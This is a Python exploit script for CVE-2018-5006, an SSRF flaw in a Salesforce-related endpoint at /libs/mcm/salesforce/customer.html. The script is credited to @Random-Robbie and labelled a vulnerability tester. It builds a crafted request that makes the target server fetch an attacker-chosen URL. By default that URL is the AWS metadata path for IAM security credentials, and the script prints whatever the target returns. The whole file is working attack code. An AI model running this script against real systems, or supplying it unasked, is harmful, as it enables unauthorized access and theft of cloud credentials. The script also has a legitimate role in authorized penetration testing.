#!/usr/bin/env python
#
# Salesforce SSRF. - CVE-2018-5006
#
#
# By @Random-Robbie
# 
#

import requests
import sys
import argparse
import random
import string
import os.path
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser(description="Salesforce SSRF Vulnerability Tester - CVE-2018-5006")
parser.add_argument("-u", "--url",   required=True, help="Target Salesforce URL")
parser.add_argument("-p", "--proxy", required=False, help="Proxy for debugging (e.g., http://127.0.0.1:8080)")
parser.add_argument("-s", "--ssrf", required=False, default="http://169.254.169.254/latest/meta-data/iam/security-credentials/", help="SSRF target URL (default: AWS metadata endpoint)")
args = parser.parse_args()
url = args.url
proxy = args.proxy
ssrfurl = args.ssrf



proxyDict = {}
if proxy:
	proxyDict = {
		"http"  : proxy,
		"https" : proxy,
		"ftp"   : proxy
	}
            




def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))





def try_ssrf(url, ssrfurl, rgen):
	paramsGet = {
		"customer_secret": rgen,
		"customer_key": rgen,
		"refresh_token": rgen,
		"instance_url": ssrfurl
	}
	headers = {
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0",
		"Connection": "close",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate"
	}

	target_url = f"{url}/libs/mcm/salesforce/customer.html;%{rgen}.css"
	print(f"[*] Testing SSRF on: {url}")
	print(f"[*] Target SSRF URL: {ssrfurl}")

	response = session.get(target_url, params=paramsGet, headers=headers, verify=False, timeout=30, proxies=proxyDict)

	if response.status_code == 200:
		print("\n" + "="*50)
		print("[+] SSRF VULNERABILITY FOUND!")
		print("="*50)
		print(f"Response:\n{response.text}")
		print("="*50 + "\n")
		sys.exit(0)
	elif response.status_code == 403:
		print("[-] WAF detected - blocking attempts")
		sys.exit(0)
	else:
		print(f"[-] SSRF attempt failed (Status: {response.status_code})")
		print(f"Response: {response.text[:200]}...")
		

if __name__ == "__main__":
	try:
		rgen = randomString()
		try_ssrf(url, ssrfurl, rgen)

	except KeyboardInterrupt:
		print("\n[!] Ctrl-C pressed, exiting...")
		sys.exit(1)

	except Exception as e:
		print(f'[!] Error: {e}')
		sys.exit(1)
 
